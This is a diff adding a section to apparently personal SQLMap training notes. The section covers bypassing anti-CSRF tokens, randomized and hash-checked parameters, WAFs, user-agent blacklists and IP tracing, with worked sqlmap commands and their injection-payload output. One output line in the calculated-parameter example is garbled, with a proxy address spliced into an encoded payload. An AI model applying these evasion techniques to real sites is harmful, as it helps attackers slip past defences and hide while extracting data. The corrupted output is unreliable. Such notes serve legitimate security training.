@@ -79,6 +79,15 @@
     - [Searching for Data](#searching-for-data)
     - [Password Enumeration and Cracking](#password-enumeration-and-cracking)
     - [DB Users Password Enumeration and Cracking](#db-users-password-enumeration-and-cracking)
+  - [Bypassing Web Application Protections](#bypassing-web-application-protections)
+    - [Anti-CSRF Token Bypass](#anti-csrf-token-bypass)
+    - [Unique Value Bypass](#unique-value-bypass)
+    - [Calculated Parameter Bypass](#calculated-parameter-bypass)
+    - [IP Address Concealing](#ip-address-concealing)
+    - [WAF Bypass](#waf-bypass)
+    - [User-agent Blacklisting Bypass](#user-agent-blacklisting-bypass)
+    - [Tamper Scripts](#tamper-scripts)
+    - [Miscellaneous Bypasses](#miscellaneous-bypasses)
 
 ---
 
@@ -1795,3 +1804,97 @@ database management system users password hashes:
 [*] ending @ 14:25:28 /2020-09-18/
 ```
 
+## Bypassing Web Application Protections
+
+### Anti-CSRF Token Bypass
+
+> [!NOTE]
+> CSRF tokens are unique, hard-to-guess strings used by web applications to protect against cross-site request forgery attacks by ensuring that requests originate from authenticated users.
+
+In most basic terms, each HTTP request should have a (valid) token value available only if the user actually visited and used the page. While the original idea was the prevention of scenarios with malicious links, where just opening these links would have undesired consequences for unaware logged-in users, this security feature also inadvertently hardened the applications against unwanted automation.
+
+Nevertheless, SQLMap has options that can help in bypassing anti-CSRF protection, namely ```--csrf-token```. By specifying the token parameter name, SQLMap will automatically attempt to parse the target response content and search for fresh token values so it can use them in the next request.
+
+Additionally, even in a case where the user does not explicitly specify the token's name via ```--csrf-token```, if one of the provided parameters contains any of the common infixes, the user will be prompted whether to update it in further requests.
+
+```bash
+d41y@htb[/htb]$ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.9}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[*] starting @ 22:18:01 /2020-09-18/
+
+POST parameter 'csrf-token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] y
+```
+
+### Unique Value Bypass
+
+In some cases, the web application may only require unique values to be provided inside predefined parameters. Such a mechanism is similar to the anti-CSRF token, except that there is no need to parse the web page content. So, by simply ensuring that each request has a unique value for a predefined parameter, the web application can easily prevent CSRF attempts while at the same time averting some of the automation tools. For this, the option ```--randomize``` should be used, pointing to the parameter name containing a value which should be randomized before being sent.
+
+```bash
+d41y@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
+
+URI: http://www.example.com:80/?id=1&rp=99954
+URI: http://www.example.com:80/?id=1&rp=87216
+URI: http://www.example.com:80/?id=9030&rp=36456
+URI: http://www.example.com:80/?id=1.%2C%29%29%27.%28%28%2C%22&rp=16689
+URI: http://www.example.com:80/?id=1%27xaFUVK%3C%27%22%3EHKtQrg&rp=40049
+URI: http://www.example.com:80/?id=1%29%20AND%209368%3D6381%20AND%20%287422%3D7422&rp=95185
+```
+
+### Calculated Parameter Bypass
+
+Another similar mechanism is where a web application expects a proper parameter value to be calculated based on some other parameter value(s). Most often, one parameter value has to contain the message digest of another one. To bypass this, the option ```--eval``` should be used, where a valid Python code is being evaluated just before the request is being sent to the targe.
+
+```bash
+d41y@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
+
+URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
+URI: http://www.example.com:80/?id=1&h=c4ca4238a0b923820dcc509a6f75849b
+URI: http://www.example.com:80/?id=9061&h=4d7e0d72898ae7ea3593eb5ebf20c744
+URI: http://www.example.com:80/?id=1%2C.%2C%27%22.%2C%28.%29&h=620460a56536e2d32fb2f4842ad5a08d
+URI: http://www.example.com:80/?id=1%27MyipGP%3C%27%22%3EibjjSu&h=db7c815825b14d67aaa32da09b8b2d42
+URI: http://www.example.com:80/?id=1%29%20AND%209978%socks4://177.39.187.70:33283ssocks4://177.39.187.70:332833D1232%20AND%20%284955%3D4955&h=02312acd4ebe69e2528382dfff7fc5cc
+```
+
+### IP Address Concealing
+
+A proxy can be set with the option ```--proxy``` (_e.g. --proxy="socks4://177.39.187.70:33283"_).
+
+In addition to that, if you have a list of proxies, you can provide them to SQLMap with the option ```--proxy-file```. This way, SQLMap will go sequentially through the list, and in case of any problems, it will just skip from current to the next from the list. The other option is Tor network use to provide an easy to use anonymization, where your IP can appear anywhere from a large list of Tor exit nodes. By using the ```--tor``` switch, SQLMap will automatically try to find the local port and use it appropriately.
+
+To check that Tor is properly being used, you could use ```--check-tor```.
+
+### WAF Bypass
+
+Whenever you run SQLMap, as part of the initial tests, SLQMap sends a predefined malicious looking payload using a non-existent parameter name to test for the existence of a WAF. There will be a substantial change in the response compared to the original in case of any protection between the user and the target. For example, if one of the most popular WAF solutions, ModSecurity, is implemented, there should be a ```406 - Not Acceptable``` response after such a request.
+
+In case of a positive detection, to identify the actual protection mechanism, SQLMap uses a third-party library _identYwaf_, containing the signature of 80 different WAF solutions. If you wanted to skip this heuristical test altogether (_less noisy_), you can use the switch ```--skip-waf```.
+
+### User-agent Blacklisting Bypass
+
+In case of immediate problems while running SQLMap, one of the first things you should think of is the potential blacklisting of the default user-agent used by SQLMap.
+
+This is trivial to bypass with the switch ```--random-agent```, which changes the default user-agent with a randomly chosen value from a large pool of values used by browsers.
+
+### Tamper Scripts
+
+One of the most popular mechanisms implemented in SQLMap for bypassing WAF/IPS solutions is the so-called "tamper" scripts. These are a special kind of (_Python_) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection.
+
+Tamper scripts can be chained, one after another within the ```--tamper``` option, where they are run based on predefined priority. A priority is predefined to prevent any unwanted behavior, as some scripts modify payloads by modifying their SQL syntax. In contrast, some tamper scripts do not care about the inner content.
+
+To get a whole list of implemented tamper scripts, along with the description, switch ```--list-tampers``` can be used.
+
+### Miscellaneous Bypasses
+
+1. ```--chunked```
+   - splits the POST request's body into so-called "chunks"
+   - blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed
+2. HTTP parameter pollution
+   - payloads are split in a similar way
+   - then, are concatenated by the target platform if supporting it
